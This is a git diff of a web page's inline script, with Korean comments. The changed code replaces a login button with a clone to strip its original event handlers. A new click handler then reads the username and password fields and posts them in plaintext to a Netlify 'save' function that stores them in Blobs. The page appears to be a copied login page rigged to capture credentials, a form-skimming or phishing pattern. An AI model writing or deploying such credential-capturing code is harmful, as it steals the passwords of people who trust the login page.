@@ -681,40 +681,63 @@
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
 <script>
-document.getElementById("login-button").addEventListener("click", async (e) => {
-  e.preventDefault();
+document.addEventListener("DOMContentLoaded", () => {
 
-  // 버튼 클릭 테스트
-  alert("버튼 클릭 감지!");
+  // 기존 버튼 가져오기
+  const oldButton = document.getElementById("login-button");
 
-  const getText = (id) => {
-    const el = document.getElementById(id);
-    if (!el) throw new Error("ID 없음: " + id);
-    return el.value ?? el.textContent;
-  };
-
-  try {
-    const text1 = getText("login-username");
-    const text2 = getText("login-password");
-
-    const response = await fetch("/.netlify/functions/save", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ text1, text2 })
-    });
-
-    if (!response.ok) throw new Error(await response.text());
-
-    const result = await response.json();
-
-    alert("Blobs 저장 성공!\nID: " + result.id);
-
-  } catch (error) {
-    alert("오류: " + error.message);
-    console.error(error);
+  if (!oldButton) {
+    alert("버튼 ID를 찾을 수 없음!");
+    return;
   }
+
+  // 기존 버튼 복제 (기존 addEventListener 제거)
+  const newButton = oldButton.cloneNode(true);
+  newButton.type = "button";
+  newButton.removeAttribute("onclick");
+
+  // 기존 버튼 교체
+  oldButton.replaceWith(newButton);
+
+  // 새로운 클릭 이벤트
+  newButton.addEventListener("click", async (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+
+    alert("버튼 클릭 감지!");
+
+    try {
+      const getText = (id) => {
+        const el = document.getElementById(id);
+        if (!el) throw new Error("ID 없음: " + id);
+        return el.value ?? el.textContent;
+      };
+
+      const text1 = getText("login-username");
+      const text2 = getText("login-password");
+
+      const response = await fetch("/.netlify/functions/save", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ text1, text2 })
+      });
+
+      if (!response.ok) {
+        throw new Error(await response.text());
+      }
+
+      const result = await response.json();
+
+      alert("Blobs 저장 성공!\nID: " + result.id);
+
+    } catch (error) {
+      alert("오류: " + error.message);
+      console.error(error);
+    }
+  });
+
 });
 </script>
 </body></html>
